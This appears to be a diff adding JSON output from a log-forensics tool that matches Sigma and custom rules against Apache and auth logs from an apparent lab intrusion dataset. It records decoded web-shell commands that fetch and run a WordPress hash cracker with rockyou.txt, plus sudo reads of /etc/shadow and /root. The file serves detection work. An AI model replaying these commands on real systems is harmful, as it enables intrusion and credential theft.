+            "atlas/rules/linux/debian/web/web_req_with_cmd_file_resource.yml": {
+                "type": "File Resource Commands in HTTP Request",
+                "source": "atlas",
+                "level": "high"
+            },
+            "sigma/web/proxy_generic/proxy_ua_susp.yml": {
+                "type": "Suspicious User Agent",
+                "source": "sigma",
+                "level": "high"
+            },
+            "sigma/web/proxy_generic/proxy_ua_susp_base64.yml": {
+                "type": "Potential Base64 Encoded User-Agent",
+                "source": "sigma",
+                "level": "medium"
+            }
+        },
+        "type": "File Resource Commands in HTTP Request",
+        "description": "File Resource Commands in HTTP Request: '[\"wget\", \"https://github.com/ait-aecid/wphashcrack/archive/refs/tags/v0.1.tar.gz\"]' via GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D from 172.17.130.196 (code 200)",
+        "category": "Web Application Attack",
+        "plugin": "LOG-Apache Access Log-text/apache_access",
+        "files": "OS:evidences\\\\\\\\apache2\\\\\\\\intranet.price.fox.org-access.log.2",
+        "keys": {
+            "Decoded_Payload": "[\"wget\", \"https://github.com/ait-aecid/wphashcrack/archive/refs/tags/v0.1.tar.gz\"]",
+            "Request_URI": "/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D",
+            "HTTP_Method": "GET",
+            "Source_IP": "172.17.130.196",
+            "Response_Code": "200",
+            "User_Agent": "python-requests/2.27.1"
+        },
+        "count": 1,
+        "ids": [
+            26
+        ]
+    },
+    "16": {
+        "id": 27,
+        "date_time_min": "2022-01-18T12:38:32.000000+00:00",
+        "date_time_max": "2022-01-18T12:38:32.000000+00:00",
+        "evidence_message": "http_request: POST / HTTP/1.1 from: 10.35.35.118 code: 200 user_agent: python-requests/2.27.1",
+        "type_candidate": {
+            "atlas/rules/linux/debian/web/web_req_suspicious_ua.yml": {
+                "type": "HTTP Request with Suspicious User Agent",
+                "source": "atlas",
+                "level": "medium"
+            }
+        },
+        "type": "HTTP Request with Suspicious User Agent",
+        "description": "HTTP Request with Suspicious User Agent: POST / from 10.35.35.118 (code 200, user agent python-requests/2.27.1)",
+        "category": "Web Application Attack",
+        "plugin": "LOG-Apache Access Log-text/apache_access",
+        "files": "OS:evidences\\\\\\\\apache2\\\\\\\\intranet.price.fox.org-access.log.2",
+        "keys": {
+            "Request_URI": "/",
+            "HTTP_Method": "POST",
+            "Source_IP": "10.35.35.118",
+            "Response_Code": "200",
+            "User_Agent": "python-requests/2.27.1"
+        },
+        "count": 1,
+        "ids": [
+            27
+        ]
+    },
+    "17": {
+        "id": 31,
+        "date_time_min": "2022-01-18T12:39:01.000000+00:00",
+        "date_time_max": "2022-01-18T12:39:01.000000+00:00",
+        "evidence_message": "[sudo] phopkins : TTY=pts/0 ; PWD=/home/phopkins ; USER=root ; COMMAND=/usr/bin/tail /var/log/syslog",
+        "type_candidate": {
+            "sigma/linux/auditd/lnx_auditd_keylogging_with_pam_d.yml": {
+                "type": "Linux Keylogging with Pam.d",
+                "source": "sigma",
+                "level": "high"
+            },
+            "sigma/web/proxy_generic/proxy_ua_susp_base64.yml": {
+                "type": "Potential Base64 Encoded User-Agent",
+                "source": "sigma",
+                "level": "medium"
+            }
+        },
+        "type": "Linux Keylogging with Pam.d",
+        "description": "Detect attempt to enable auditing of TTY input",
+        "category": "auditd",
+        "plugin": "LOG-Log File-text/syslog_traditional",
+        "files": "OS:evidences\\\\\\\\auth.log",
+        "keys": {
+            "Target_User": "phopkins",
+            "Source_IP": "",
+            "Service": "sudo"
+        },
+        "count": 1,
+        "ids": [
+            31
+        ]
+    },
+    "18": {
+        "id": 28,
+        "date_time_min": "2022-01-18T12:39:03.000000+00:00",
+        "date_time_max": "2022-01-18T12:39:06.000000+00:00",
+        "evidence_message": "http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ0YXIiLCAieHZmeiIsICJ2MC4xLnRhci5neiJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [\"tar\", \"xvfz\", \"v0.1.tar.gz\"]]",
+        "type_candidate": {
+            "atlas/rules/linux/debian/web/web_req_suspicious_ua.yml": {
+                "type": "HTTP Request with Suspicious User Agent",
+                "source": "atlas",
+                "level": "medium"
+            },
+            "atlas/rules/linux/debian/web/web_req_with_cmd_file_resource.yml": {
+                "type": "File Resource Commands in HTTP Request",
+                "source": "atlas",
+                "level": "high"
+            },
+            "sigma/web/proxy_generic/proxy_ua_susp_base64.yml": {
+                "type": "Potential Base64 Encoded User-Agent",
+                "source": "sigma",
+                "level": "medium"
+            }
+        },
+        "type": "File Resource Commands in HTTP Request",
+        "description": "File Resource Commands in HTTP Request: '[\"tar\", \"xvfz\", \"v0.1.tar.gz\"]' via GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ0YXIiLCAieHZmeiIsICJ2MC4xLnRhci5neiJd from 172.17.130.196 (code 200)",
+        "category": "Web Application Attack",
+        "plugin": "LOG-Apache Access Log-text/apache_access",
+        "files": "OS:evidences\\\\\\\\apache2\\\\\\\\intranet.price.fox.org-access.log.2",
+        "keys": {
+            "Decoded_Payload": "[\"tar\", \"xvfz\", \"v0.1.tar.gz\"]",
+            "Request_URI": "/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJ0YXIiLCAieHZmeiIsICJ2MC4xLnRhci5neiJd",
+            "HTTP_Method": "GET",
+            "Source_IP": "172.17.130.196",
+            "Response_Code": "200",
+            "User_Agent": "python-requests/2.27.1"
+        },
+        "count": 2,
+        "ids": [
+            28,
+            29
+        ]
+    },
+    "19": {
+        "id": 30,
+        "date_time_min": "2022-01-18T12:39:11.000000+00:00",
+        "date_time_max": "2022-01-18T12:39:11.000000+00:00",
+        "evidence_message": "http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAicGhvcGtpbnMiXQ%3D%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: [\"./wphashcrack-0.1/wphashcrack.sh\", \"-w\", \"$PWD/rockyou.txt\", \"-j\", \"./wphashcrack-0.1/john-1.7.6-jumbo-12-Linux64/run\", \"-u\", \"phopkins\"]]",
+        "type_candidate": {
+            "atlas/rules/linux/debian/web/web_req_suspicious_ua.yml": {
+                "type": "HTTP Request with Suspicious User Agent",
+                "source": "atlas",
+                "level": "medium"
+            },
+            "atlas/rules/linux/debian/web/web_req_with_cmd_shell_exec.yml": {
+                "type": "Shell Script Execution Commands in HTTP Request",
+                "source": "atlas",
+                "level": "critical"
+            },
+            "sigma/web/proxy_generic/proxy_ua_susp_base64.yml": {
+                "type": "Potential Base64 Encoded User-Agent",
+                "source": "sigma",
+                "level": "medium"
+            }
+        },
+        "type": "Shell Script Execution Commands in HTTP Request",
+        "description": "Shell Script Execution Commands in HTTP Request: '[\"./wphashcrack-0.1/wphashcrack.sh\", \"-w\", \"$PWD/rockyou.txt\", \"-j\", \"./wphashcrack-0.1/john-1.7.6-jumbo-12-Linux64/run\", \"-u\", \"phopkins\"]' via GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAicGhvcGtpbnMiXQ%3D%3D from 172.17.130.196 (code 200)",
+        "category": "Web Application Attack",
+        "plugin": "LOG-Apache Access Log-text/apache_access",
+        "files": "OS:evidences\\\\\\\\apache2\\\\\\\\intranet.price.fox.org-access.log.2",
+        "keys": {
+            "Decoded_Payload": "[\"./wphashcrack-0.1/wphashcrack.sh\", \"-w\", \"$PWD/rockyou.txt\", \"-j\", \"./wphashcrack-0.1/john-1.7.6-jumbo-12-Linux64/run\", \"-u\", \"phopkins\"]",
+            "Request_URI": "/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAicGhvcGtpbnMiXQ%3D%3D",
+            "HTTP_Method": "GET",
+            "Source_IP": "172.17.130.196",
+            "Response_Code": "200",
+            "User_Agent": "python-requests/2.27.1"
+        },
+        "count": 1,
+        "ids": [
+            30
+        ]
+    },
+    "20": {
+        "id": 32,
+        "date_time_min": "2022-01-18T13:14:41.000000+00:00",
+        "date_time_max": "2022-01-18T13:14:41.000000+00:00",
+        "evidence_message": "[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=list",
+        "type_candidate": {
+            "atlas/rules/linux/debian/web/linux_www_sudo.yml": {
+                "type": "Sudo Command Executed in Web Directory",
+                "source": "atlas",
+                "level": "high"
+            },
+            "sigma/linux/auditd/lnx_auditd_keylogging_with_pam_d.yml": {
+                "type": "Linux Keylogging with Pam.d",
+                "source": "sigma",
+                "level": "high"
+            },
+            "sigma/web/proxy_generic/proxy_ua_susp_base64.yml": {
+                "type": "Potential Base64 Encoded User-Agent",
+                "source": "sigma",
+                "level": "medium"
+            }
+        },
+        "type": "Sudo Command Executed in Web Directory",
+        "description": "Sudo Command Executed in Web Directory: user 'phopkins' ran 'list' as root from /var/www/intranet.price.fox.org/wp-content/uploads/2022/01",
+        "category": "Privilege Escalation",
+        "plugin": "LOG-Log File-text/syslog_traditional",
+        "files": "OS:evidences\\\\\\\\auth.log",
+        "keys": {
+            "Sudo_User": "phopkins",
+            "Command": "list",
+            "Run_As_User": "root",
+            "Working_Directory": "/var/www/intranet.price.fox.org/wp-content/uploads/2022/01",
+            "TTY": "pts/1"
+        },
+        "count": 1,
+        "ids": [
+            32
+        ]
+    },
+    "21": {
+        "id": 33,
+        "date_time_min": "2022-01-18T13:14:43.000000+00:00",
+        "date_time_max": "2022-01-18T13:14:43.000000+00:00",
+        "evidence_message": "[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/ls -laR /root/",
+        "type_candidate": {
+            "atlas/rules/linux/debian/web/linux_www_sudo.yml": {
+                "type": "Sudo Command Executed in Web Directory",
+                "source": "atlas",
+                "level": "high"
+            },
+            "atlas/rules/linux/debian/web/linux_www_sudo_list.yml": {
+                "type": "Sudo List Command Executed from Web Directory",
+                "source": "atlas",
+                "level": "critical"
+            },
+            "sigma/linux/auditd/lnx_auditd_keylogging_with_pam_d.yml": {
+                "type": "Linux Keylogging with Pam.d",
+                "source": "sigma",
+                "level": "high"
+            },
+            "sigma/web/proxy_generic/proxy_ua_susp_base64.yml": {
+                "type": "Potential Base64 Encoded User-Agent",
+                "source": "sigma",
+                "level": "medium"
+            }
+        },
+        "type": "Sudo List Command Executed from Web Directory",
+        "description": "Sudo List Command Executed from Web Directory: user 'phopkins' ran '/bin/ls -laR /root/' as root from /var/www/intranet.price.fox.org/wp-content/uploads/2022/01",
+        "category": "Privilege Escalation",
+        "plugin": "LOG-Log File-text/syslog_traditional",
+        "files": "OS:evidences\\\\\\\\auth.log",
+        "keys": {
+            "Sudo_User": "phopkins",
+            "Command": "/bin/ls -laR /root/",
+            "Run_As_User": "root",
+            "Working_Directory": "/var/www/intranet.price.fox.org/wp-content/uploads/2022/01",
+            "TTY": "pts/1"
+        },
+        "count": 1,
+        "ids": [
+            33
+        ]
+    },
+    "22": {
+        "id": 34,
+        "date_time_min": "2022-01-18T13:14:49.000000+00:00",
+        "date_time_max": "2022-01-18T13:14:49.000000+00:00",
+        "evidence_message": "[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/cat /etc/shadow",
+        "type_candidate": {
+            "atlas/rules/linux/debian/web/linux_www_sudo.yml": {
+                "type": "Sudo Command Executed in Web Directory",
+                "source": "atlas",
+                "level": "high"
+            },
+            "atlas/rules/linux/debian/web/linux_www_sudo_read.yml": {
+                "type": "Sudo Read Command Executed from Web Directory",
+                "source": "atlas",
+                "level": "critical"
+            },
+            "atlas/rules/linux/debian/web/web_lfi.yml": {
+                "type": "Local File Inclusion",
+                "source": "atlas",
+                "level": "high"
+            },
+            "sigma/linux/auditd/lnx_auditd_keylogging_with_pam_d.yml": {
+                "type": "Linux Keylogging with Pam.d",
+                "source": "sigma",
+                "level": "high"
+            },
+            "sigma/linux/process_creation/proc_creation_lnx_local_account.yml": {
+                "type": "Local System Accounts Discovery - Linux",
+                "source": "sigma",
+                "level": "low"
+            },
+            "sigma/web/proxy_generic/proxy_ua_susp_base64.yml": {
+                "type": "Potential Base64 Encoded User-Agent",
+                "source": "sigma",
+                "level": "medium"
+            }
+        },
+        "type": "Sudo Read Command Executed from Web Directory",
+        "description": "Sudo Read Command Executed from Web Directory: user 'phopkins' ran '/bin/cat /etc/shadow' as root from /var/www/intranet.price.fox.org/wp-content/uploads/2022/01",
+        "category": "Privilege Escalation",
+        "plugin": "LOG-Log File-text/syslog_traditional",
+        "files": "OS:evidences\\\\\\\\auth.log",
+        "keys": {
+            "Sudo_User": "phopkins",
+            "Command": "/bin/cat /etc/shadow",
+            "Run_As_User": "root",
+            "Working_Directory": "/var/www/intranet.price.fox.org/wp-content/uploads/2022/01",
+            "TTY": "pts/1"
+        },
+        "count": 1,
+        "ids": [
+            34
+        ]
+    },
+    "23": {
+        "id": 35,
+        "date_time_min": "2022-01-18T13:14:50.000000+00:00",
+        "date_time_max": "2022-01-18T13:14:50.000000+00:00",
+        "evidence_message": "[sudo] jwilkinson : TTY=pts/1 ; PWD=/var/www/intranet.hallbrown.wilson.com/wp-content/uploads/2022/02 ; USER=root ; COMMAND=/sbin/iptables -L",
+        "type_candidate": {
+            "atlas/rules/linux/debian/web/linux_www_sudo.yml": {
+                "type": "Sudo Command Executed in Web Directory",
+                "source": "atlas",
+                "level": "high"
+            },
+            "atlas/rules/linux/debian/web/linux_www_sudo_network.yml": {
+                "type": "Sudo Network Command Executed from Web Directory",
+                "source": "atlas",
+                "level": "critical"
+            },
+            "sigma/linux/auditd/lnx_auditd_keylogging_with_pam_d.yml": {
+                "type": "Linux Keylogging with Pam.d",
+                "source": "sigma",
+                "level": "high"
+            },
+            "sigma/linux/process_creation/proc_creation_lnx_system_network_discovery.yml": {
+                "type": "System Network Discovery - Linux",
+                "source": "sigma",
+                "level": "informational"
+            },
+            "sigma/web/proxy_generic/proxy_ua_susp_base64.yml": {
+                "type": "Potential Base64 Encoded User-Agent",
+                "source": "sigma",
+                "level": "medium"
+            }
+        },
+        "type": "Sudo Network Command Executed from Web Directory",
+        "description": "Sudo Network Command Executed from Web Directory: user 'jwilkinson' ran '/sbin/iptables -L' as root from /var/www/intranet.hallbrown.wilson.com/wp-content/uploads/2022/02",
+        "category": "Privilege Escalation",
+        "plugin": "LOG-Log File-text/syslog_traditional",
+        "files": "OS:/mnt/d/0experiment/1-1-plaso-sec/data-p-ait-v2-wilson/evidences/auth.log",
+        "keys": {
+            "Sudo_User": "jwilkinson",
+            "Command": "/sbin/iptables -L",
+            "Run_As_User": "root",
+            "Working_Directory": "/var/www/intranet.hallbrown.wilson.com/wp-content/uploads/2022/02",
+            "TTY": "pts/1"
+        },
+        "count": 1,
+        "ids": [
+            35
+        ]
+    },
+    "24": {
+        "id": 37,
+        "date_time_min": "2025-04-29T05:35:51.000000+00:00",
+        "date_time_max": "2025-04-29T05:35:51.000000+00:00",
+        "evidence_message": "[sshd] [943610]: Accepted password for root from 243.23.54.175 port 37190 ssh2",
+        "type_candidate": {
+            "atlas/rules/linux/debian/web/linux_login_activity.yml": {
+                "type": "User Login Activity in Server",
+                "source": "atlas",
+                "level": "medium"
+            }
+        },
+        "type": "User Login Activity in Server",
+        "description": "User 'root' logged in (password) from 243.23.54.175:37190 via sshd",
+        "category": "Authentication",
+        "plugin": "LOG-Log File-text/syslog_traditional",
+        "files": "OS:D:\\0experiment\\1-1-plaso-sec\\data\\evidences\\var\\log\\auth.log",
+        "keys": {
+            "Target_User": "root",
+            "Login_Method": "password",
+            "Source_IP": "243.23.54.175",
+            "Source_Port": "37190",
+            "Service": "sshd"
+        },
+        "count": 2,
+        "ids": [
+            37,
+            38
+        ]
+    },
+    "25": {
+        "id": 41,
+        "date_time_min": "2025-04-29T05:46:59.000000+00:00",
+        "date_time_max": "2025-04-29T05:46:59.000000+00:00",
+        "evidence_message": "http_request: GET /static/baseTemplate/assets/finalLoginPageCSS/200.css HTTP/1.1 from: 243.23.54.175 code: 200 referer: https://71.34.77.74:8090/ user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/155.155.155.155 Safari/537.36",
+        "type_candidate": {
+            "sigma/web/proxy_generic/proxy_ua_frameworks.yml": {
+                "type": "Exploit Framework User Agent",
+                "source": "sigma",
+                "level": "high"
+            },
+            "sigma/web/proxy_generic/proxy_ua_malware.yml": {
+                "type": "Malware User Agent",
+                "source": "sigma",
+                "level": "high"
+            },
+            "sigma/web/proxy_generic/proxy_ua_susp.yml": {
+                "type": "Suspicious User Agent",
+                "source": "sigma",
+                "level": "high"
+            }
+        },
+        "type": "Exploit Framework User Agent",
+        "description": "Detects suspicious user agent strings used by exploit / pentest frameworks like Metasploit in proxy logs",
+        "category": "proxy",
+        "plugin": "LOG-Apache Access Log-text/apache_access",
+        "files": "OS:D:\\0experiment\\1-1-plaso-sec\\data\\evidences\\usr\\local\\lscp\\cyberpanel\\logs\\access.log",
+        "keys": {
+            "Request_URI": "/static/baseTemplate/assets/finalLoginPageCSS/200.css",
+            "HTTP_Method": "GET",
+            "Source_IP": "243.23.54.175",
+            "Response_Code": "200",
+            "User_Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/155.155.155.155 Safari/537.36"
+        },
+        "count": 1,
+        "ids": [
+            41
+        ]
+    },
+    "26": {
+        "id": 42,
+        "date_time_min": "2025-04-29T05:47:14.000000+00:00",
+        "date_time_max": "2025-04-29T05:47:14.000000+00:00",
+        "evidence_message": "http_request: POST /verifyLogin HTTP/1.1 from: 243.23.54.175 code: 200 referer: https://71.34.77.74:8090/ user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/155.155.155.155 Safari/537.36",
+        "type_candidate": {
+            "atlas/rules/linux/debian/web/web_cyberpanel_login.yml": {
+                "type": "Login Cyberpanel Attempts",
+                "source": "atlas",
+                "level": "high"
+            },
+            "sigma/web/proxy_generic/proxy_ua_frameworks.yml": {
+                "type": "Exploit Framework User Agent",
+                "source": "sigma",
+                "level": "high"
+            },
+            "sigma/web/proxy_generic/proxy_ua_malware.yml": {
+                "type": "Malware User Agent",
+                "source": "sigma",
+                "level": "high"
+            },
+            "sigma/web/proxy_generic/proxy_ua_susp.yml": {
+                "type": "Suspicious User Agent",
+                "source": "sigma",
+                "level": "high"
+            }
+        },
+        "type": "Login Cyberpanel Attempts",
+        "description": "Login Cyberpanel Attempts: POST /verifyLogin from 243.23.54.175 (code 200, user agent Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/155.155.155.155 Safari/537.36)",
+        "category": "Web Application Attack",
+        "plugin": "LOG-Apache Access Log-text/apache_access",
+        "files": "OS:D:\\0experiment\\1-1-plaso-sec\\data\\evidences\\usr\\local\\lscp\\cyberpanel\\logs\\access.log",
+        "keys": {
+            "Request_URI": "/verifyLogin",
+            "HTTP_Method": "POST",
+            "Source_IP": "243.23.54.175",
+            "Response_Code": "200",
+            "User_Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) Chrome/155.155.155.155 Safari/537.36"
+        },
+        "count": 1,
+        "ids": [
+            42
+        ]
+    },
+    "27": {
+        "id": 43,
+        "date_time_min": "2025-04-29T06:05:31.000000+00:00",
+        "date_time_max": "2025-04-29T06:05:31.000000+00:00",
+        "evidence_message": "[sshd] [951322]: Failed password for root from 71.238.128.110 port 54700 ssh2",
+        "type_candidate": {
+            "atlas/rules/linux/debian/linux/custom_susp/lnx_auth_failure.yml": {
+                "type": "Authentication Failure",
+                "source": "atlas",
+                "level": "medium"
+            },
+            "atlas/rules/linux/debian/web/linux_login_attempt.yml": {
+                "type": "SSH Failed Login Attempt",
+                "source": "atlas",
+                "level": "medium"
+            }
+        },
+        "type": "Authentication Failure",
+        "description": "Failed Password for user 'root' from 71.238.128.110:54700 via sshd",
+        "category": "Authentication",
+        "plugin": "LOG-Log File-text/syslog_traditional",
+        "files": "OS:D:\\0experiment\\1-1-plaso-sec\\data\\evidences\\var\\log\\auth.log",
+        "keys": {
+            "Failure_Type": "Failed Password",
+            "Target_User": "root",
+            "Source_IP": "71.238.128.110",
+            "Source_Port": "54700",
+            "Service": "sshd",
+            "User_Validity": "valid",
+            "TTY": "",
+            "Remote_Host": ""
+        },
+        "count": 1,
+        "ids": [
+            43
+        ]
+    },
+    "28": {
+        "id": 44,
+        "date_time_min": "2025-04-29T06:05:31.000000+00:00",
+        "date_time_max": "2025-04-29T06:05:31.000000+00:00",
+        "evidence_message": "[passwd] [951308]: pam_unix(passwd:chauthtok): password changed for webadmin_cyberpanel",
+        "type_candidate": {
+            "atlas/rules/linux/debian/web/linux_pass_change.yml": {
+                "type": "Password Change Activity",
+                "source": "atlas",
+                "level": "high"
+            }
+        },
+        "type": "Password Change Activity",
+        "description": "Password changed for user 'webadmin_cyberpanel' via passwd",
+        "category": "Account Management",
+        "plugin": "LOG-Log File-text/syslog_traditional",
+        "files": "OS:D:\\0experiment\\1-1-plaso-sec\\data\\evidences\\var\\log\\auth.log",
+        "keys": {
+            "Target_User": "webadmin_cyberpanel",
+            "Action": "changed",
+            "Service": "passwd"
+        },
+        "count": 1,
+        "ids": [
+            44
+        ]
+    },
+    "29": {
+        "id": 45,
+        "date_time_min": "2025-04-29T06:05:32.000000+00:00",
+        "date_time_max": "2025-04-29T06:05:37.000000+00:00",
+        "evidence_message": "[systemd] pam_unix(systemd-user:session): session opened for user phopkins by (uid=0)",
+        "type_candidate": {
+            "atlas/rules/linux/debian/linux/custom_susp/lnx_session_opened.yml": {
+                "type": "Session Opened",
+                "source": "atlas",
+                "level": "informational"
+            },
+            "sigma/web/proxy_generic/proxy_ua_susp_base64.yml": {
+                "type": "Potential Base64 Encoded User-Agent",
+                "source": "sigma",
+                "level": "medium"
+            }
+        },
+        "type": "Potential Base64 Encoded User-Agent",
+        "description": "Detects User Agent strings that end with an equal sign, which can be a sign of base64 encoding.",
+        "category": "proxy",
+        "plugin": "LOG-Log File-text/syslog_traditional",
+        "files": "OS:D:\\0experiment\\1-1-plaso-sec\\data\\evidences\\var\\log\\auth.log",
+        "keys": {
+            "Target_User": "phopkins",
+            "Source_IP": "",
+            "Service": "systemd"
+        },
+        "count": 2,
+        "ids": [
+            45,
+            50
+        ]
+    }
+}
